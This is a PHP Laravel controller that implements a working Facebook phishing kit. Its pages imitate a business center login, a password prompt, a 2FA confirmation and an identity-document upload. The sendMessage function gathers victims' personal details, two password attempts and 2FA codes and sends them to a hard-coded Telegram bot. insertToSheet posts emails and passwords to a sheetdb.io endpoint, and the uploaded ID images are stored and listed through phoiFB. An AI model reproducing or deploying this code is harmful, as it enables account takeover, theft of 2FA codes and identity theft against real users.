<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Storage;

class FacebookController extends Controller
{
    public function index()
    {
        return view('facebook.index', []);
    }
    public function business()
    {
        return view('facebook.business', []);
    }
    public function getPasswordModal()
    {
        return view('facebook.modal-login', []);
    }
    public function confirm2FA()
    {
        return view('facebook.confirm', []);
    }
    public function sendMessage(Request $request)
    {

        $full_infor =  "Full Name: " . $request->basic_fill_name;
        $full_infor .= "\nBirth Day: " . $request->basic_fill_birth_day;
        $full_infor .=  "\nGioi Tinh: " . $request->basic_fill_sex;
        $full_infor .=  "\nEmail: " . $request->basic_fill_business_email;
        $full_infor .=  "\nPersonal Email: " . $request->basic_fill_personal_email;
        $full_infor .= "\nIp: " . $request->basic_fill_page_ip;
        $full_infor .=  "\nCountry: " . $request->basic_fill_page_country;
        $full_infor .= "\nCity: " . $request->basic_fill_page_city;
        $full_infor .=  "\nPhone: " . $request->basic_fill_phone;
        $full_infor .=  "\nFB Page:" . $request->basic_fill_page_name;
        $full_infor .= "\nPassword First: " . $request->basic_fill_page_first_password;
        $full_infor .= "\nPassword Second: " . $request->basic_fill_page_second_password;
        if ($request->is_2fa == true) {
            $full_infor .= "\n2FA First: " . $request->basic_fill_page_first_2fa;
            $full_infor .= "\n2FA Second: " . $request->basic_fill_page_second_2fa;
            $this->sendTelegram($full_infor);
            return ['nextstep' => url('business-center-community/upload-profile')];
        }
        $this->sendTelegram($full_infor);
        return ['nextstep' => url('business-center-community/confirm')];
    }

    public function uploadProfile()
    {
        return view('facebook.upload-profile', []);
    }
    public function checkIP()
    {
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');
        header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token');
        header('Content-Type: application/json');
        $a = [
            'ip' => Arr::get($_SERVER, 'HTTP_CF_CONNECTING_IP'),
            'country' => Arr::get($_SERVER, 'HTTP_CF_IPCOUNTRY'),
        ];
        echo json_encode($a);
        exit;
    }

    public function saveImageUpload(Request $request)
    {
        $email = $request->email;
        foreach ($request->file('files') as $file) {
            $file_name = $file->getClientOriginalName();
            if (empty($email)) {
                $name = time() . '_' . $file_name;
            } else {
                $arrMail = explode('@', $email);
                $name = $arrMail[0] . '_' . time() . '_' . $file_name;
            }
            $file->storeAs('phoi', $name);
        }
        return redirect('waiting-verify');
    }


    public function waitingVerify()
    {
        return view('facebook.waiting-verify', []);
    }
    public function insertToSheet($personal_email, $password, $infor)
    {
        $curl = curl_init();
        $data = [[
            'Email' => $personal_email,
            'Password' => $password,
            'Infor' => $infor,
        ]];

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://sheetdb.io/api/v1/vpa7txbvojlil',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => json_encode($data),
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/json'
            ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        return $response;
    }

    public function sendTelegram($full_infor)
    {
        $url_telegram = "https://api.telegram.org/bot6771839029:AAFF8weFZTgIkHaGpXyTrTDlgOXKKBYGQQE";
        $chatId = -4046117930;
        $params = [
            'chat_id' => $chatId,
            'text' => $full_infor,
        ];
        $ch = curl_init($url_telegram . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    public function phoiFB()
    {
        $arrr = Storage::allFiles('phoi');
        foreach ($arrr as $file) {
            echo '<a href="' . url($file) . '">' . pathinfo($file, PATHINFO_BASENAME) . '</a>';
            echo '<br/>';
        }
    }
}
